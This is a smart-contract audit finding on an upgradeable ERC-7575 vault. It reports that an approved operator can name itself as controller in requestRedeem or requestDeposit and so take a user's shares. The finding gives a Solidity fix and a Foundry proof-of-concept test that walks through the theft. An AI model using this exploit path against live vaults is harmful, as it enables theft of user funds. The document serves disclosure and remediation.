## Title
Operator Can Drain All User Shares by Redirecting Controller Address in Async Requests

## Summary
The `setOperator()` function grants operators unrestricted permission across all vaults and operations without per-action granularity. [1](#0-0)  A malicious operator can exploit this by calling `requestRedeem()` or `requestDeposit()` with themselves as the `controller` parameter while using the victim's assets/shares, effectively redirecting all benefits to their own address. This allows complete theft of user funds.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/ERC7575VaultUpgradeable.sol` - `requestRedeem()` function (lines 715-751) and `requestDeposit()` function (lines 341-371)

**Intended Logic:** The operator system is designed to allow trusted delegates to help users manage their vault positions. When an operator calls `requestRedeem()` on behalf of a user, the intent is that the user retains control over where their redeemed assets ultimately go.

**Actual Logic:** The authorization check only validates that `msg.sender` is either the `owner` OR an approved operator for the `owner`. [2](#0-1)  There is NO validation that when an operator calls the function, the `controller` parameter must equal the `owner`. This allows operators to specify arbitrary controller addresses, including themselves.

**Exploitation Path:**

1. **Victim grants operator permission**: Alice calls `shareToken.setOperator(bob, true)` thinking Bob will help manage her positions across all vaults. [1](#0-0) 

2. **Malicious operator redirects redemption**: Bob calls `vault.requestRedeem(aliceShares, bob, alice)` specifying himself as the `controller` while Alice is the `owner`. The authorization passes because Bob is an approved operator for Alice. [2](#0-1) 

3. **Shares transferred from victim**: Alice's shares are transferred from her to the vault. [3](#0-2) 

4. **Pending redemption credited to attacker**: The pending redemption is credited to Bob (the controller), not Alice. [4](#0-3) 

5. **Investment manager fulfills request**: The investment manager fulfills the redemption, moving Bob's pending redemption to claimable state.

6. **Attacker claims assets**: Bob calls `vault.redeem(shares, bob, bob)` to claim the assets to his own address. The authorization passes because Bob is the controller. [5](#0-4) 

**Security Property Broken:** This violates the **"No Fund Theft"** invariant (Invariant #12) - the operator can bypass proper authorization to steal user funds through controller address manipulation.

## Impact Explanation
- **Affected Assets**: All shares across ALL vaults in the multi-asset system (USDC, USDT, DAI, etc.) for any user who has approved an operator
- **Damage Severity**: Complete loss of all shares/assets - 100% of user holdings can be stolen in a single transaction flow
- **User Impact**: Any user who grants operator permission to any address is vulnerable. The operator permission works globally across all vaults [6](#0-5) , amplifying the attack surface.

## Likelihood Explanation
- **Attacker Profile**: Any address approved as an operator by a user. This could be a compromised trusted party, a malicious protocol, or a user-approved contract with hidden malicious logic.
- **Preconditions**: 
  - User must have called `setOperator(attacker, true)`
  - User must have shares/assets in any vault
- **Execution Complexity**: Single transaction for `requestRedeem()`, then wait for fulfillment, then single transaction for `redeem()` - straightforward execution
- **Frequency**: Can be executed immediately after gaining operator approval, repeatedly across multiple victims

## Recommendation

Add validation to ensure that when an operator (not the owner) calls async request functions, the `controller` must equal the `owner`:

```solidity
// In src/ERC7575VaultUpgradeable.sol, function requestRedeem, after line 726:

// CURRENT (vulnerable):
bool isOwnerOrOperator = owner == msg.sender || IERC7540($.shareToken).isOperator(owner, msg.sender);
if (!isOwnerOrOperator) {
    ShareTokenUpgradeable($.shareToken).spendAllowance(owner, msg.sender, shares);
}

// FIXED:
bool isOwner = owner == msg.sender;
bool isOperator = IERC7540($.shareToken).isOperator(owner, msg.sender);

if (!isOwner && !isOperator) {
    // Neither owner nor operator - check allowance
    ShareTokenUpgradeable($.shareToken).spendAllowance(owner, msg.sender, shares);
} else if (isOperator && !isOwner) {
    // Operator calling on behalf of owner - enforce controller must be owner
    if (controller != owner) {
        revert InvalidController(); // Add new error
    }
}
```

Apply the same fix to `requestDeposit()` at line 344 and any other functions where operators can specify controller addresses (`cancelDepositRequest`, `cancelRedeemRequest`, etc.).

## Proof of Concept

```solidity
// File: test/Exploit_OperatorControllerTheft.t.sol
// Run with: forge test --match-test test_OperatorStealsSharesByRedirectingController -vvv

pragma solidity ^0.8.30;

import {ERC7575VaultUpgradeable} from "../src/ERC7575VaultUpgradeable.sol";
import {ShareTokenUpgradeable} from "../src/ShareTokenUpgradeable.sol";
import {MockAsset} from "./MockAsset.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {Test} from "forge-std/Test.sol";

contract Exploit_OperatorControllerTheft is Test {
    ERC7575VaultUpgradeable public vault;
    ShareTokenUpgradeable public shareToken;
    MockAsset public asset;
    
    address public owner = makeAddr("owner");
    address public alice = makeAddr("alice"); // victim
    address public bob = makeAddr("bob"); // malicious operator
    address public investmentManager = makeAddr("investmentManager");
    
    function setUp() public {
        vm.startPrank(owner);
        
        asset = new MockAsset();
        
        // Deploy ShareToken
        ShareTokenUpgradeable shareTokenImpl = new ShareTokenUpgradeable();
        bytes memory shareTokenInitData = abi.encodeWithSelector(
            ShareTokenUpgradeable.initialize.selector, 
            "Test Shares", 
            "TST", 
            owner
        );
        ERC1967Proxy shareTokenProxy = new ERC1967Proxy(address(shareTokenImpl), shareTokenInitData);
        shareToken = ShareTokenUpgradeable(address(shareTokenProxy));
        
        // Deploy Vault
        ERC7575VaultUpgradeable vaultImpl = new ERC7575VaultUpgradeable();
        bytes memory vaultInitData = abi.encodeWithSelector(
            ERC7575VaultUpgradeable.initialize.selector,
            IERC20Metadata(address(asset)),
            address(shareToken),
            owner
        );
        ERC1967Proxy vaultProxy = new ERC1967Proxy(address(vaultImpl), vaultInitData);
        vault = ERC7575VaultUpgradeable(address(vaultProxy));
        
        shareToken.registerVault(address(asset), address(vault));
        shareToken.setInvestmentManager(investmentManager);
        
        vm.stopPrank();
        
        // Give Alice 100,000 tokens
        asset.mint(alice, 100000e18);
    }
    
    function test_OperatorStealsSharesByRedirectingController() public {
        uint256 depositAmount = 10000e18;
        
        // SETUP: Alice deposits and gets shares
        vm.startPrank(alice);
        asset.approve(address(vault), depositAmount);
        vault.requestDeposit(depositAmount, alice, alice);
        vm.stopPrank();
        
        vm.prank(investmentManager);
        vault.fulfillDeposit(alice, depositAmount);
        
        vm.prank(alice);
        uint256 aliceShares = vault.deposit(depositAmount, alice);
        
        assertEq(shareToken.balanceOf(alice), aliceShares, "Alice should have shares");
        assertGt(aliceShares, 0, "Alice should have non-zero shares");
        
        // Alice naively grants Bob operator permission thinking he'll help manage positions
        vm.prank(alice);
        shareToken.setOperator(bob, true);
        
        // EXPLOIT STEP 1: Bob calls requestRedeem with HIMSELF as controller, Alice as owner
        vm.prank(bob);
        vault.requestRedeem(aliceShares, bob, alice); // bob is controller, alice is owner
        
        // Verify Alice's shares were transferred to vault
        assertEq(shareToken.balanceOf(alice), 0, "Alice shares transferred to vault");
        assertEq(shareToken.balanceOf(address(vault)), aliceShares, "Vault holds shares");
        
        // Verify pending redemption is credited to BOB (not Alice!)
        assertEq(vault.pendingRedeemRequest(0, bob), aliceShares, "Bob controls the redemption");
        assertEq(vault.pendingRedeemRequest(0, alice), 0, "Alice has no pending redemption");
        
        // EXPLOIT STEP 2: Investment manager fulfills redemption
        vm.prank(investmentManager);
        uint256 assets = vault.fulfillRedeem(bob, aliceShares);
        
        // Verify claimable redemption is for BOB
        assertEq(vault.claimableRedeemRequest(0, bob), aliceShares, "Bob can claim");
        assertEq(vault.claimableRedeemRequest(0, alice), 0, "Alice cannot claim");
        
        uint256 bobBalanceBefore = asset.balanceOf(bob);
        
        // EXPLOIT STEP 3: Bob claims the assets to his own address
        vm.prank(bob);
        uint256 receivedAssets = vault.redeem(aliceShares, bob, bob);
        
        // VERIFY: Bob successfully stole Alice's shares converted to assets
        assertEq(asset.balanceOf(bob), bobBalanceBefore + receivedAssets, "Bob received Alice's assets");
        assertGt(receivedAssets, 0, "Bob received non-zero assets");
        assertEq(shareToken.balanceOf(address(vault)), 0, "Shares were burned");
        
        // Alice lost everything
        assertEq(shareToken.balanceOf(alice), 0, "Alice has no shares");
        assertEq(vault.claimableRedeemRequest(0, alice), 0, "Alice has nothing to claim");
        
        console.log("Alice's stolen assets:", receivedAssets);
        console.log("Bob's final balance:", asset.balanceOf(bob));
    }
}
```

**Notes**

This vulnerability stems from the ERC-7540 specification allowing `controller` to differ from `owner`, but the protocol fails to restrict this capability when operators (not owners) are calling the functions. The existing tests only verify cases where `controller == owner`. [7](#0-6) [8](#0-7) 

The same vulnerability exists in `requestDeposit()` where an operator can steal assets by redirecting the deposit controller. [9](#0-8) [10](#0-9) 

The operator permission is intentionally global across all vaults [6](#0-5) , which amplifies the impact - a single operator approval exposes the user's positions in ALL asset vaults (USDC, USDT, DAI, etc.).

### Citations

**File:** src/ShareTokenUpgradeable.sol (L470-471)
```text
     * - Works across all vaults in the system
     *
```

**File:** src/ShareTokenUpgradeable.sol (L480-486)
```text
    function setOperator(address operator, bool approved) external virtual returns (bool) {
        if (msg.sender == operator) revert CannotSetSelfAsOperator();
        ShareTokenStorage storage $ = _getShareTokenStorage();
        $.operators[msg.sender][operator] = approved;
        emit OperatorSet(msg.sender, operator, approved);
        return true;
    }
```

**File:** src/ERC7575VaultUpgradeable.sol (L344-344)
```text
        if (!(owner == msg.sender || IERC7540($.shareToken).isOperator(owner, msg.sender))) revert InvalidOwner();
```

**File:** src/ERC7575VaultUpgradeable.sol (L364-364)
```text
        $.pendingDepositAssets[controller] += assets;
```

**File:** src/ERC7575VaultUpgradeable.sol (L723-726)
```text
        bool isOwnerOrOperator = owner == msg.sender || IERC7540($.shareToken).isOperator(owner, msg.sender);
        if (!isOwnerOrOperator) {
            ShareTokenUpgradeable($.shareToken).spendAllowance(owner, msg.sender, shares);
        }
```

**File:** src/ERC7575VaultUpgradeable.sol (L740-742)
```text
        if (!ShareTokenUpgradeable($.shareToken).vaultTransferFrom(owner, address(this), shares)) {
            revert ShareTransferFailed();
        }
```

**File:** src/ERC7575VaultUpgradeable.sol (L745-746)
```text
        $.pendingRedeemShares[controller] += shares;
        $.activeRedeemRequesters.add(controller);
```

**File:** src/ERC7575VaultUpgradeable.sol (L887-889)
```text
        if (!(controller == msg.sender || IERC7540($.shareToken).isOperator(controller, msg.sender))) {
            revert InvalidCaller();
        }
```

**File:** test/OperatorRedemptionTest.t.sol (L86-86)
```text
        uint256 requestId = vault.requestRedeem(shares, alice, alice);
```

**File:** test/OperatorRedemptionTest.t.sol (L191-191)
```text
        vault.requestRedeem(sharesPerTest, alice, alice);
```
